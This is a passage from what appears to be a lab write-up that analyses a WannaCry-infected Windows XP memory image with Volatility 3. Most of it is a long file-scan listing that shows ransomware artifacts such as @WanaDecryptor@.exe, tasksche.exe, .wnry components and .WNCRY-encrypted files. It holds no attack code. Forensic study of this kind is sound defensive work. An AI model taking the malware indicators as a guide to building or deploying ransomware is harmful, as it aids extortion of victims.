1168	wscntfy.exe	C:\WINDOWS\system32\wscntfy.exe
```

This shows us what execuitables where run for each process. Agian, no major red flags with the exception of `@WanaDecryptor@`

```Text
740	@WanaDecryptor@	@WanaDecryptor@.exe
```


#### `windows.filescan.FileScan`

This one scans for files that are found within the memory dump

```Shell
root@ip-10-10-136-65:/home/ubuntu/Desktop/tasks/Wcry_memory_image# vol3 -f wcry.mem windows.filescan.FileScan
Volatility 3 Framework 2.0.0
Progress:  100.00		PDB scanning finished                        
Offset	Name	Size

0x1f40310	\Endpoint	112
0x1f65718	\Endpoint	112
0x1f66cd8	\WINDOWS\system32\wbem\wmipcima.dll	112
0x1f67198	\WINDOWS\Prefetch\TASKDL.EXE-01687054.pf	112
0x1f67a70	\WINDOWS\system32\security.dll	112
0x1f67c68	\boot.ini	112
0x1f67ef8	\WINDOWS\system32\cfgmgr32.dll	112
0x1f684d0	\WINDOWS\system32\wbem\framedyn.dll	112
0x1f686d8	\WINDOWS\system32\wbem\cimwin32.dll	112
0x1f6a7f0	\WINDOWS\system32\kmddsp.tsp	112
0x1f6ae20	\$Directory	112
0x1f6b9b0	\$Directory	112
0x1f6bbf8	\$Directory	112
0x1f6bdc8	\PIPE_EVENTROOT\CIMV2SCM EVENT PROVIDER	112
0x1f6be60	\WINDOWS\win.ini	112
0x1f6bf90	\$Directory	112
0x1f6c2a8	\$Directory	112
0x1f6c3b8	\$Directory	112
0x1f6cea0	\$Directory	112
0x1f6d158	\lsass	112
0x1f6d4a8	\$Directory	112
0x1f6dba8	\$Directory	112
0x1f6e188	\$Directory	112
0x1f6e6a0	\$Directory	112
0x1f70708	\WINDOWS\system32\rastapi.dll	112
0x1f71190	\$Directory	112
0x1f71b88	\WINDOWS\system32\wbem\Logs\wbemess.log	112
0x1f72f90	\$Directory	112
0x1f732b0	\WINDOWS\system32\uniplat.dll	112
0x1f735d8	\$Directory	112
0x1f753d8	\WINDOWS\system32	112
0x1f75888	\$Directory	112
0x1f75ba8	\$Directory	112
0x1f75df0	\$Directory	112
0x1f761a8	\$Directory	112
0x1f76368	\$Directory	112
0x1f769e0	\$Directory	112
0x1f76b10	\$Directory	112
0x1f76e58	\Documents and Settings\All Users\Start Menu\desktop.ini	112
0x1f76f48	\$Directory	112
0x1f77028	\Documents and Settings\donny\Start Menu\Programs\Accessories\Accessibility\desktop.ini	112
0x1f77298	\$Directory	112
0x1f77728	\$Directory	112
0x1f7a190	\$Directory	112
0x1f7a590	\$Directory	112
0x1f7a990	\$Directory	112
0x1f7aea0	\$Directory	112
0x1f7b308	\$Directory	112
0x1f7b748	\$Directory	112
0x1f7bbd0	\$Directory	112
0x1f7d518	\$Directory	112
0x1f7da18	\Documents and Settings\All Users\Application Data\Microsoft\User Account Pictures\Default Pictures\butterfly.bmp.WNCRY	112
0x1f7dae0	\$Directory	112
0x1f7f180	\Documents and Settings\donny\My Documents\My Pictures\Desktop.ini	112
0x1f7f218	\WINDOWS\system32\rasqec.dll	112
0x1f7f538	\WINDOWS\WindowsUpdate.log	112
0x1f80bd8	\$Directory	112
0x1f81548	\WINDOWS\system32\wbem\framedyn.dll	112
0x1f83390	\$Directory	112
0x1f83758	\WINDOWS\Fonts\times.ttf	112
0x1f840a0	\$Directory	112
0x1f866b8	\$Directory	112
0x1f87028	\WINDOWS\system32\c_1258.nls	112
0x1f871a0	\Intel\ivecuqmanpnirkt615\@WanaDecryptor@.exe	112
0x1f87c10	\WINDOWS\Fonts\timesbd.ttf	112
0x1f87f08	\WINDOWS\system32\msls31.dll	112
0x1f88140	\WINDOWS\system32\c_1257.nls	112
0x1f885e8	\WINDOWS\system32\c_1256.nls	112
0x1f88d00	\WINDOWS\system32\c_1254.nls	112
0x1f8d548	\$Directory	112
0x1f8f798	\$Directory	112
0x1f8f9c0	\$Directory	112
0x1f8fbf8	\$Directory	112
0x1f90438	\$Directory	112
0x1f90a38	\$Directory	112
0x1f90ea0	\$Directory	112
0x1f92cf0	\$Directory	112
0x1f92d88	\ROUTER	112
0x1f95c28	\$Directory	112
0x1f990d8	\srvsvc	112
0x1f997c8	\WINDOWS\WinSxS\x86_Microsoft.Windows.Common-Controls_6595b64144ccf1df_6.0.2600.6028_x-ww_61e65202	112
0x1f99a18	\WINDOWS\WinSxS\x86_Microsoft.Windows.Common-Controls_6595b64144ccf1df_6.0.2600.6028_x-ww_61e65202	112
0x1f99ab0	\trkwks	112
0x1f99d20	\$Directory	112
0x1f9a848	\WINDOWS\system32\c_1255.nls	112
0x1f9aea8	\WINDOWS\system32\c_1253.nls	112
0x1f9fe18	\lsass	112
0x1fa1e60	\WINDOWS\WinSxS\x86_Microsoft.Windows.Common-Controls_6595b64144ccf1df_6.0.2600.6028_x-ww_61e65202	112
0x1fa1ef8	\winreg	112
0x1fa1f90	\WINDOWS\WinSxS\x86_Microsoft.Windows.Common-Controls_6595b64144ccf1df_6.0.2600.6028_x-ww_61e65202	112
0x1fa2c88	\WINDOWS\WindowsUpdate.log	112
0x1fa30c0	\$Directory	112
0x1fa55b0	\$Directory	112
0x1fa6960	\$Directory	112
0x1fa6ba8	\$Directory	112
0x1fa6df0	\$Directory	112
0x1fa8cc0	\WINDOWS\WinSxS\Manifests\x86_Microsoft.Windows.Common-Controls_6595b64144ccf1df_6.0.2600.6028_x-ww_61e65202.Manifest	112
0x1fac638	\$Directory	112
0x1facf28	\$Directory	112
0x1fb12c0	\{9B365890-165F-11D0-A195-0020AFD156E4}	112
0x1fb17a8	\Intel\ivecuqmanpnirkt615\@WanaDecryptor@.exe	112
0x1fb1880	\WINDOWS\Debug\UserMode\userenv.log	112
0x1fb1a40	\WINDOWS\pchealth\helpctr\BATCH	112
0x1fb2278	\Intel\ivecuqmanpnirkt615\taskse.exe	112
0x1fb3d10	\keysvc	112
0x1fb5620	\WINDOWS\system32\wbem\wmipcima.dll	112
0x1fb6310	\Documents and Settings\donny\Start Menu\Programs\Startup\desktop.ini	112
0x1fb7650	\WINDOWS\system32\mfc42.dll	112
0x1fb78a0	\$Directory	112
0x1fb7eb8	\keysvc	112
0x1fb7f50	\DAV RPC SERVICE	112
0x1fb8350	\srvsvc	112
0x1fb88c8	\lsass	112
0x1fba540	\WINDOWS\system32\wbem\Logs\wbemcore.log	112
0x1fbad10	\47	112
0x1fbc250	\$Directory	112
0x1fbce00	\WINDOWS\WinSxS\x86_Microsoft.Windows.Common-Controls_6595b64144ccf1df_6.0.2600.6028_x-ww_61e65202	112
0x1fbcef8	\Intel\ivecuqmanpnirkt615\u.wnry	112
0x1fde628	\WINDOWS\system32\ntlanman.dll	112
0x1fde6c0	\WINDOWS\system32\netui0.dll	112
0x1fe4f90	\$Directory	112
0x1fe5858	\Endpoint	112
0x1fe5a40	\$Directory	112
0x1fe5b50	\$Directory	112
0x1fe65c8	\PIPE_EVENTROOT\CIMV2SCM EVENT PROVIDER	112
0x1fe6718	\$Directory	112
0x1fe6b40	\$Directory	112
0x1fe6d20	\$Directory	112
0x1fe7c48	\{9B365890-165F-11D0-A195-0020AFD156E4}	112
0x1fe7d00	\winreg	112
0x1fe7f90	\{9B365890-165F-11D0-A195-0020AFD156E4}	112
0x1fe8390	\PCHFaultRepExecPipe	112
0x1fe8940	\$Directory	112
0x1fec388	\WINDOWS\system32\c_1251.nls	112
0x1fec580	\WINDOWS\system32\c_949.nls	112
0x1fec6b8	\$Directory	112
0x1fee638	\WINDOWS\system32\wbem\cimwin32.dll	112
0x1ff7c78	\WINDOWS\system32\h323.tsp	112
0x1ff7d10	\WINDOWS\system32\ipconf.tsp	112
0x1ff8bd8	\WINDOWS\system32\security.dll	112
0x2004650	\WINDOWS\WinSxS\x86_Microsoft.Windows.Common-Controls_6595b64144ccf1df_6.0.2600.6028_x-ww_61e65202	112
0x20046e8	\net\NtControlPipe7	112
0x2005848	\SfcApi	112
0x2005930	\SfcApi	112
0x200cd20	\WINDOWS\WinSxS\x86_Microsoft.Windows.Common-Controls_6595b64144ccf1df_6.0.2600.6028_x-ww_61e65202	112
0x200d6b0	\WINDOWS\SchedLgU.Txt	112
0x200df90	\Endpoint	112
0x20147a8	\WINDOWS\0.log	112
0x2014a38	\PCHHangRepExecPipe	112
0x2014b30	\srvsvc	112
0x201f820	\WINDOWS\system32\mui\041D	112
0x201f948	\WINDOWS\system32\mui\041b	112
0x2021820	\WINDOWS\system32\mui\0419	112
0x2021948	\WINDOWS\system32\mui\0416	112
0x2022678	\$Directory	112
0x2022720	\$Directory	112
0x2022998	\WINDOWS\system32\narrator.exe	112
0x2025870	\WINDOWS\system32\mui\0415	112
0x2025998	\WINDOWS\system32\mui\0414	112
0x2026818	\WINDOWS\system32\mui\0413	112
0x2026900	\WINDOWS\system32\mui\0412	112
0x2026998	\WINDOWS\WinSxS\x86_Microsoft.Windows.Common-Controls_6595b64144ccf1df_6.0.2600.6028_x-ww_61e65202	112
0x20288d8	\WINDOWS\Help\Tours\mmTour	112
0x2028998	\WINDOWS\system32\IME\TINTLGNT	112
0x2029848	\WINDOWS\system32\spool\drivers\color	112
0x2029970	\WINDOWS\PeerNet	112
0x202a6b0	\Program Files\Common Files\Microsoft Shared\Speech\1033	112
0x202a748	\Program Files\Common Files\SpeechEngines\Microsoft	112
0x202a870	\WINDOWS\system32\wbem\snmp	112
0x202a998	\WINDOWS\Resources\Themes\Luna\Shell\Metallic	112
0x202b638	\Program Files\Internet Explorer	112
0x202b8b0	\Program Files\Common Files\Microsoft Shared\VGX	112
0x202c938	\Documents and Settings\LocalService\NTUSER.DAT	112
0x202d848	\Program Files\Common Files\MSSoap\Binaries\Resources\1033	112
0x202d998	\Program Files\Common Files\MSSoap\Binaries	112
0x202e820	\WINDOWS\system32\oobe	112
0x202e948	\Program Files\Outlook Express	112
0x2030998	\spoolss	112
0x2031710	\WINDOWS\ime\chsime\applets	112
0x2031970	\Program Files\Windows NT\Pinball	112
0x2033748	\WINDOWS\ime\shared\res	112
0x2033870	\WINDOWS\system32\npp	112
0x2033998	\WINDOWS\mui	112
0x20348e8	\net\NtControlPipe5	112
0x2037718	\WINDOWS\WinSxS\x86_Microsoft.Windows.Common-Controls_6595b64144ccf1df_6.0.2600.6028_x-ww_61e65202	112
0x203c918	\WINDOWS\system32	112
0x203f7b8	\Program Files\Common Files\SpeechEngines\Microsoft\TTS\1033	112
0x203f8e0	\WINDOWS\system32\Restore	112
0x2042718	\Documents and Settings\LocalService\Local Settings\Application Data\Microsoft\Windows\UsrClass.dat	112
0x20456b8	\WINDOWS\Resources\Themes\Luna\Shell\Homestead	112
0x2045870	\WINDOWS\Resources\Themes\Luna\Shell\NormalColor	112
0x2045998	\Program Files\Common Files\Microsoft Shared\Speech	112
0x2084c78	\WINDOWS\system32\hidphone.tsp	112
0x2084d10	\WINDOWS\system32\h323log.txt	112
0x20865f0	\WINDOWS\WinSxS\x86_Microsoft.Windows.Common-Controls_6595b64144ccf1df_6.0.2600.6028_x-ww_61e65202	112
0x2088ab8	\WINDOWS\WinSxS\x86_Microsoft.Windows.Common-Controls_6595b64144ccf1df_6.0.2600.6028_x-ww_61e65202	112
0x2088bf0	\Documents and Settings\All Users\Start Menu\Programs\Accessories\Communications\Wireless Network Setup Wizard.lnk	112
0x2089978	\$Directory	112
0x2089bd0	\WINDOWS\system32\magnify.exe	112
0x208b198	\$Directory	112
0x208b5d8	\WINDOWS\WinSxS\x86_Microsoft.Windows.Common-Controls_6595b64144ccf1df_6.0.2600.6028_x-ww_61e65202	112
0x208c5f8	\WINDOWS\system32\mui\0424	112
0x208c720	\WINDOWS\system32\mui\041f	112
0x208d238	\EVENTLOG	112
0x209db50	\WINDOWS\WinSxS\Policies\x86_policy.6.0.Microsoft.Windows.Common-Controls_6595b64144ccf1df_x-ww_5ddad775\6.0.2600.6028.Policy	112
0x209dbe8	\Intel\ivecuqmanpnirkt615\00000000.res	112
0x209ddb0	\WINDOWS\system32\wbem\wmiprvse.exe	112
0x209de48	\Intel\ivecuqmanpnirkt615\b.wnry	112
0x209e1c0	\$Directory	112
0x209e3a0	\$Directory	112
0x209e580	\$Directory	112
0x20a0e38	\WINDOWS\WinSxS\x86_Microsoft.Windows.Common-Controls_6595b64144ccf1df_6.0.2600.6028_x-ww_61e65202	112
0x215b838	\browser	112
0x215c230	\WINDOWS\ime\imjp8_1\applets	112
0x215c418	\WINDOWS\WinSxS\x86_Microsoft.Windows.Common-Controls_6595b64144ccf1df_6.0.2600.6028_x-ww_61e65202	112
0x215cad0	\Documents and Settings\donny\Start Menu\Programs\Accessories\desktop.ini	112
0x215e330	\$Directory	112
0x215e648	\$Directory	112
0x2162028	\net\NtControlPipe1	112
0x2162d50	\$Directory	112
0x2162df8	\$Directory	112
0x2162f90	\WINDOWS\system32\wucltui.dll	112
0x2164698	\$Directory	112
0x2164740	\$Directory	112
0x2164ed0	\$Directory	112
0x2165a80	\$Directory	112
0x2167f90	\$Directory	112
0x216a028	\atsvc	112
0x216a0d0	\epmapper	112
0x216b038	\$Directory	112
0x216b310	\WINDOWS\system32\config\system	112
0x216b3a8	\WINDOWS\system32\config\SECURITY	112
0x216be98	\$Directory	112
0x216c270	\WINDOWS\system32\olesvr32.dll	112
0x216cc68	\WINDOWS\WinSxS\x86_Microsoft.Windows.GdiPlus_6595b64144ccf1df_1.0.6002.23084_x-ww_f3f35550\GdiPlus.dll	112
0x216cef8	\WINDOWS\system32\url.dll	112
0x216cf90	\WINDOWS\system32\olethk32.dll	112
0x2170b38	\Endpoint	112
0x2172038	\$Directory	112
0x2172198	\Endpoint	112
0x2175038	\$Directory	112
0x2179038	\$Directory	112
0x2179f90	\$Directory	112
0x217a028	\WINDOWS\WinSxS\x86_Microsoft.Windows.Common-Controls_6595b64144ccf1df_6.0.2600.6028_x-ww_61e65202	112
0x217cef8	\WINDOWS\system32\$winnt$.inf	112
0x217e028	\scerpc	112
0x217e138	\scerpc	112
0x217e378	\$Directory	112
0x217ef90	\$Directory	112
0x2180320	\$Directory	112
0x2183038	\$Directory	112
0x2184128	\WINDOWS\system32	112
0x2184318	\$Directory	112
0x2185320	\$Directory	112
0x2187f90	\WINDOWS\system32\olecnv32.dll	112
0x21885d8	\WINDOWS\system32\ndptsp.tsp	112
0x2189238	\WINDOWS\Tasks	112
0x218b028	\WINDOWS\system32\dllcache	112
0x218b690	\net\NtControlPipe6	112
0x218b848	\WINDOWS\system32\drivers\etc	112
0x218b8e0	\Documents and Settings\donny\Start Menu\Programs\Accessories\Address Book.lnk	112
0x218c320	\epmapper	112
0x218ce08	\WINDOWS\WinSxS\x86_Microsoft.Windows.Common-Controls_6595b64144ccf1df_6.0.2600.6028_x-ww_61e65202	112
0x218cf90	\$Directory	112
0x218de68	\net\NtControlPipe3	112
0x218e0c8	\Endpoint	112
0x218ff10	\$Directory	112
0x2190038	\$Directory	112
0x2191038	\$Directory	112
0x2192d78	\$Directory	112
0x2194840	\$Directory	112
0x21948d8	\WINDOWS\system32\olecli32.dll	112
0x2194d00	\$Directory	112
0x2195038	\$Directory	112
0x2199418	\WINDOWS\system32\unimdm.tsp	112
0x219a130	\ntsvcs	112
0x219be98	\TerminalServer\AutoReconnect	112
0x219c198	\wkssvc	112
0x219cee8	\$Directory	112
0x219d028	\Documents and Settings\All Users\Start Menu\Programs\Games\Minesweeper.lnk	112
0x219d1c0	\Documents and Settings\LocalService\Cookies\index.dat	112
0x219d908	\Documents and Settings\All Users\Application Data\Microsoft\User Account Pictures\Default Pictures\chess.bmp.WNCRY	112
0x219e120	\WINDOWS\WinSxS\x86_Microsoft.Windows.Common-Controls_6595b64144ccf1df_6.0.2600.6028_x-ww_61e65202	112
0x219e320	\$Directory	112
0x219f320	\WINDOWS\system32\hnetwiz.dll	112
0x219f750	\WINDOWS\system32\ipnathlp.dll	112
0x219fb70	\Endpoint	112
0x219fdf0	\$Directory	112
0x21a0028	\ROUTER	112
0x21a0848	\net\NtControlPipe11	112
0x21a2320	\$Directory	112
0x21a45a8	\$Directory	112
0x21a5668	\$Directory	112
0x21a6c68	\pagefile.sys	112
0x21a6d00	\WINDOWS\system32\wow32.dll	112
0x21a7500	\$Directory	112
0x21a75a8	\$Directory	112
0x21a7f10	\Documents and Settings\NetworkService\NTUSER.DAT	112
0x21a88d8	\Documents and Settings\NetworkService\ntuser.dat.LOG	112
0x21a8f90	\winlogonrpc	112
0x21a98f0	\atsvc	112
0x21aaef8	\WINDOWS\system32\config\Internet.evt	112
0x21aaf90	\Program Files\Common Files\Microsoft Shared\web server extensions\40\isapi\_vti_adm	112
0x21ac5e0	\WINDOWS\system32\mui\0411	112
0x21adf90	\WINDOWS\repair\setup.log	112
0x21ae220	\net\NtControlPipe2	112
0x21aff90	\Documents and Settings\donny\Start Menu\Programs\desktop.ini	112
0x21b0320	\net\NtControlPipe4	112
0x21b0f90	\WINDOWS\Prefetch\@WANADECRYPTOR@.EXE-06F053F5.pf	112
0x21b1e68	\WINDOWS\system32\mui\041a	112
0x21b1f90	\WINDOWS\system32\mui\0418	112
0x21b2028	\WINDOWS\system32\mui\0406	112
0x21b2108	\WINDOWS\system32\mui\0407	112
0x21b2c48	\WINDOWS\system32\rasppp.dll	112
0x21b3e90	\WINDOWS\system32\mui\0425	112
0x21b3f90	\WINDOWS\system32\mui\041e	112
0x21b6028	\Program Files\xerox\nwwia	112
0x21b6438	\WINDOWS\system32\mui\0816	112
0x21b6560	\WINDOWS\system32\mui\0804	112
0x21b72c0	\net\NtControlPipe2	112
0x21b7e40	\WINDOWS\system32\mui\0402	112
0x21b7f68	\WINDOWS\system32\mui\0C0A	112
0x21b8028	\Endpoint	112
0x21b8ec0	\net\NtControlPipe0	112
0x21b9028	\Documents and Settings\LocalService\ntuser.dat.LOG	112
0x21b9318	\WINDOWS\system32\IME\CINTLGNT	112
0x21b9748	\WINDOWS\WinSxS\x86_Microsoft.Windows.Common-Controls_6595b64144ccf1df_6.0.2600.6028_x-ww_61e65202	112
0x21ba868	\WINDOWS\system32\davclnt.dll	112
0x21bb028	\Documents and Settings\LocalService\Local Settings\Application Data\Microsoft\Windows\UsrClass.dat.LOG	112
0x21bc068	\WINDOWS\WinSxS\x86_Microsoft.Windows.Common-Controls_6595b64144ccf1df_6.0.2600.6028_x-ww_61e65202	112
0x21be198	\255	112
0x21bf230	\WINDOWS\system32\Setup	112
0x21bf318	\WINDOWS\system32\Com	112
0x21bf758	\Ctx_WinStation_API_service	112
0x21bfc08	\WINDOWS\ime\imkr6_1\applets	112
0x21c0dd0	\WINDOWS\WinSxS\x86_Microsoft.Windows.Common-Controls_6595b64144ccf1df_6.0.2600.6028_x-ww_61e65202	112
0x21c1198	\WINDOWS\system32	112
0x21c1318	\Program Files\Internet Explorer\Connection Wizard	112
0x21c13f0	\WINDOWS\system32\xircom	112
0x21c1688	\WINDOWS\ime\imkr6_1	112
0x21c1720	\Program Files\Common Files\Microsoft Shared\MSInfo	112
0x21c1a98	\Program Files\Common Files\SpeechEngines\Microsoft\Lexicon\1033	112
0x21c1bc0	\WINDOWS\system32\IME\PINTLGNT	112
0x21c1c80	\WINDOWS\ime\shared	112
0x21c21f0	\Program Files\Common Files\System	112
0x21c2288	\Program Files\Windows NT	112
0x21c2830	\WINDOWS\srchasst	112
0x21c28c8	\WINDOWS\ime	112
0x21c2960	\Program Files\Movie Maker	112
0x21c29f8	\WINDOWS\Resources\Themes\Luna	112
0x21c2ad0	\Documents and Settings\NetworkService\Local Settings\Application Data\Microsoft\Windows\UsrClass.dat.LOG	112
0x21c2ef8	\Program Files\Windows Media Player	112
0x21c2f90	\Program Files\Common Files\Microsoft Shared\DAO	112
0x21c3238	\WINDOWS\system32\wbem\wmiprvse.exe	112
0x21c3610	\WINDOWS\pchealth\UploadLB\Binaries	112
0x21c3c58	\$Directory	112
0x21c3d00	\$Directory	112
0x21c3ea8	\WINDOWS\system32\mui\0427	112
0x21c3f90	\WINDOWS\system32\mui\0426	112
0x21c4c58	\$Directory	112
0x21c4d00	\$Directory	112
0x21c59a0	\WINDOWS	112
0x21c5f90	\WINDOWS\system32\wbem\xml	112
0x21c6028	\WINDOWS\system32\mui\0405	112
0x21c61c8	\Program Files\Common Files\Microsoft Shared\Triedit	112
0x21c62f0	\WINDOWS\ime\imjp8_1	112
0x21c6f90	\WINDOWS\system32\upnp.dll	112
0x21c7108	\WINDOWS\system32\mui\0404	112
0x21c72f0	\winlogonrpc	112
0x21c8320	\winlogonrpc	112
0x21c8c68	\Documents and Settings\donny	112
0x21c9c68	\WINDOWS\system32\filemgmt.dll	112
0x21ca028	\Endpoint	112
0x21cb198	\WINDOWS\system32	112
0x21cc870	\Documents and Settings\donny\Start Menu\Programs\Accessories\Tour Windows XP.lnk	112
0x21cd108	\WINDOWS\system32\mui\0408	112
0x21cd438	\Documents and Settings\donny\Start Menu\Programs\Accessories\Command Prompt.lnk	112
0x21cd508	\Program Files\Outlook Express\msimn.exe	112
0x21cdbc8	\Program Files\Common Files\Microsoft Shared\web server extensions\40\isapi	112
0x21cdc60	\Program Files\Common Files\Microsoft Shared\web server extensions\40\bin\1033	112
0x21cde18	\WINDOWS\system32\mui\040b	112
0x21ce1d0	\WINDOWS\system32\mui\0410	112
0x21ce2f8	\WINDOWS\system32\mui\040e	112
0x21ce898	\Program Files\Common Files\Microsoft Shared\web server extensions\40\_vti_bin	112
0x21ceba0	\Program Files\MSN Gaming Zone\Windows\bckgzm.exe	112
0x21cf260	\WINDOWS\system32\usmt	112
0x21cf3f0	\WINDOWS\system32\mui\0401	112
0x21cf4b0	\Program Files\Windows NT\Accessories	112
0x21cfb68	\WINDOWS\Debug\PASSWD.LOG	112
0x21d08d8	\WINDOWS\WinSxS\x86_Microsoft.Windows.Common-Controls_6595b64144ccf1df_6.0.2600.6028_x-ww_61e65202	112
0x21d0d00	\Program Files\microsoft frontpage\version3.0\bin	112
0x21d0dd0	\WINDOWS\system32\wbem\mof	112
0x21d1028	\Endpoint	112
0x21d15a8	\Program Files\Common Files\Microsoft Shared\web server extensions\40\bots\vinavbar	112
0x21d1d60	\WINDOWS\WinSxS\x86_Microsoft.Windows.Common-Controls_6595b64144ccf1df_6.0.2600.6028_x-ww_61e65202	112
0x21d2138	\WINDOWS\WinSxS\x86_Microsoft.Windows.Common-Controls_6595b64144ccf1df_6.0.2600.6028_x-ww_61e65202	112
0x21d2238	\Program Files\Common Files\Microsoft Shared\web server extensions\40\admisapi\scripts	112
0x21d26a8	\Program Files\Common Files\Microsoft Shared\web server extensions\40\servsupp	112
0x21d2740	\WINDOWS\system32\drivers	112
0x21d2f50	\WINDOWS\Fonts	112
0x21d3378	\Program Files\Common Files\Microsoft Shared\web server extensions\40\bin	112
0x21d3410	\WINDOWS\system32\inetsrv	112
0x21d3850	\Ctx_WinStation_API_service	112
0x21d3c60	\Program Files\Common Files\Microsoft Shared\web server extensions\40\_vti_bin\_vti_aut	112
0x21d4028	\Endpoint	112
0x21d4550	\WINDOWS\SoftwareDistribution\DataStore\Logs\edb.log	112
0x21d5028	\WINDOWS\WinSxS\x86_Microsoft.Windows.Common-Controls_6595b64144ccf1df_6.0.2600.6028_x-ww_61e65202	112
0x21d5198	\WINDOWS\system32\netui1.dll	112
0x21d6218	\Program Files\Common Files\Microsoft Shared\web server extensions\40\admcgi\scripts	112
0x21d6318	\WINDOWS\system32\1033	112
0x21d69d8	\WINDOWS\WinSxS\Manifests\x86_Microsoft.Windows.SystemCompatible_6595b64144ccf1df_5.1.2600.2000_x-ww_bcc9a281.Manifest	112
0x21d7908	\WINDOWS\WinSxS\Manifests\x86_Microsoft.Windows.Networking.RtcRes_6595b64144ccf1df_5.2.2.3_en_16a24bc0.Manifest	112
0x21d79a0	\WINDOWS\WinSxS\Manifests\x86_Microsoft.Windows.Networking.RtcDll_6595b64144ccf1df_5.2.2.3_x-ww_d6bd8b95.Manifest	112
0x21d7e08	\Documents and Settings\All Users\Start Menu\Microsoft Update Catalog.lnk	112
0x21d7f90	\WINDOWS\system32\es.dll	112
0x21d8690	\WINDOWS\WinSxS\x86_Microsoft.Windows.Common-Controls_6595b64144ccf1df_6.0.2600.6028_x-ww_61e65202	112
0x21d8ac0	\Intel\ivecuqmanpnirkt615\s.wnry	112
0x21da708	\WINDOWS\system32\OEMINFO.INI	112
0x21dac68	\WINDOWS\Installer\{20C31435-2A0A-4580-BE8B-AC06FC243CA4}\python_icon.exe	112
0x21dad60	\WINDOWS\Help	112
0x21dadf8	\Program Files\Common Files\Microsoft Shared\web server extensions\40\_vti_bin\_vti_adm	112
0x21db7b0	\WINDOWS\system32	112
0x21dc028	\Intel\ivecuqmanpnirkt615\taskdl.exe	112
0x21dc3a8	\Documents and Settings\All Users\Start Menu\Programs\Accessories\System Tools\Character Map.lnk	112
0x21dc440	\Documents and Settings\donny\Start Menu\Programs\Accessories\Notepad.lnk	112
0x21dc578	\Documents and Settings\All Users\Start Menu\Programs\Administrative Tools\Local Security Policy.lnk	112
0x21dc940	\WINDOWS\system32\rcimlby.exe	112
0x21dc9d8	\WINDOWS\explorer.exe	112
0x21dcb68	\Endpoint	112
0x21dce00	\Documents and Settings\donny\Start Menu\Programs\Accessories\Program Compatibility Wizard.lnk	112
0x21dcf90	\Documents and Settings\NetworkService\Local Settings\Application Data\Microsoft\Windows\UsrClass.dat	112
0x21dd238	\WINDOWS\system32\davclnt.dll	112
0x21dd440	\WINDOWS\system32\mfc42.dll	112
0x21dd4d8	\Documents and Settings\All Users\Start Menu\Programs\desktop.ini	112
0x21dd6a8	\protected_storage	112
0x21ddb80	\WINDOWS\system32\wucltui.dll.mui	112
0x21ddf90	\WINDOWS\system32\taskkill.exe	112
0x21de828	\WINDOWS\Fonts\arialbd.ttf	112
0x21df420	\Documents and Settings\donny\Start Menu\Programs\Remote Assistance.lnk	112
0x21e0988	\WINDOWS\system32\attrib.exe	112
0x21e0c20	\$Directory	112
0x21e0d98	\Documents and Settings\All Users\Start Menu\Programs\Accessories\Accessibility\Accessibility Wizard.lnk	112
0x21e16b0	\Endpoint	112
0x21e1748	\Documents and Settings\All Users\Start Menu\Programs\Python 2.7\Python Manuals.lnk	112
0x21e2760	\Documents and Settings\All Users\Start Menu\Programs\Games\Internet Checkers.lnk	112
0x21e28f8	\WINDOWS\system32\fldrclnr.dll	112
0x21e2ad8	\WINDOWS\system32\wbem\Repository\FS\INDEX.BTR	112
0x21e2b70	\WINDOWS\system32\wbem\Repository\FS\OBJECTS.MAP	112
0x21e5098	\WINDOWS\WinSxS\x86_Microsoft.Windows.Common-Controls_6595b64144ccf1df_6.0.2600.6028_x-ww_61e65202	112
0x21e5418	\WINDOWS\system32\rundll32.exe	112
0x21e55c0	\Winsock2\CatalogChangeListener-400-0	112
0x21e5be8	\WINDOWS\system32\oembios.bin	112
0x21e5d20	\$Extend\$ObjId	112
0x21e7038	\$Directory	112
0x21e72e0	\WINDOWS\WinSxS\x86_Microsoft.Windows.Common-Controls_6595b64144ccf1df_6.0.2600.6028_x-ww_61e65202	112
0x21e7418	\Endpoint	112
0x21e75a8	\Documents and Settings\LocalService\Local Settings\desktop.ini	112
0x21e7c68	\spoolss	112
0x21e7df8	\WINDOWS\system32\config\SysEvent.Evt	112
0x21e8740	\WINDOWS\system32\config\SecEvent.Evt	112
0x21e88b0	\Documents and Settings\All Users\Start Menu\Programs\Accessories\System Tools\System Information.lnk	112
0x21e8980	\Program Files\MSN Gaming Zone\Windows\hrtzzm.exe	112
0x21e8b38	\WINDOWS\WinSxS	112
0x21e8f28	\Program Files\Common Files\System\msadc	112
0x21e9c28	\Endpoint	112
0x21eaf90	\WINDOWS\system32\els.dll	112
0x21eb250	\WINDOWS\WinSxS\Policies\x86_policy.5.2.Microsoft.Windows.Networking.Rtcdll_6595b64144ccf1df_x-ww_c7b7206f\5.2.2.3.Policy	112
0x21eb2e8	\WINDOWS\WinSxS\Policies\x86_policy.5.2.Microsoft.Windows.Networking.Dxmrtp_6595b64144ccf1df_x-ww_362e60dd\5.2.2.3.Policy	112
0x21eb420	\Program Files\Common Files\Microsoft Shared\MSInfo\msinfo32.exe	112
0x21ec748	\wkssvc	112
0x21ec970	\WINDOWS\WinSxS\x86_Microsoft.Windows.Common-Controls_6595b64144ccf1df_6.0.2600.6028_x-ww_61e65202	112
0x21ed748	\wkssvc	112
0x21ed810	\WINDOWS\WinSxS\Manifests\x86_Microsoft.Windows.Networking.Dxmrtp_6595b64144ccf1df_5.2.2.3_x-ww_468466a7.Manifest	112
0x21ed9e0	\WINDOWS\WinSxS\Manifests\x86_Microsoft.Windows.GdiPlus_6595b64144ccf1df_1.0.6002.23084_x-ww_f3f35550.Manifest	112
0x21ee698	\WINDOWS\system32\freecell.exe	112
0x21eeaf0	\WINDOWS\system32\drprov.dll	112
0x21eef90	\ntsvcs	112
0x21ef980	\WINDOWS\system32\netshell.dll	112
0x21efc80	\protected_storage	112
0x21f02b8	\$Directory	112
0x21f0b70	\$Directory	112
0x21f1418	\Documents and Settings\All Users\Start Menu\Programs\Accessories\System Tools\Files and Settings Transfer Wizard.lnk	112
0x21f1700	\Program Files\Common Files\Microsoft Shared\web server extensions\40\isapi\_vti_aut	112
0x21f18d8	\WINDOWS\system32\msiexec.exe	112
0x21f1c88	\Documents and Settings\donny\Start Menu\Programs\Outlook Express.lnk	112
0x21f1f90	\WINDOWS\SoftwareDistribution\DataStore\DataStore.edb	112
0x21f2368	\Documents and Settings\LocalService\Local Settings\Temporary Internet Files\Content.IE5\index.dat	112
0x21f2400	\Documents and Settings\donny\My Documents\desktop.ini	112
0x21f2910	\$Directory	112
0x21f2b70	\$Directory	112
0x21f3870	\Intel\ivecuqmanpnirkt615\tasksche.exe	112
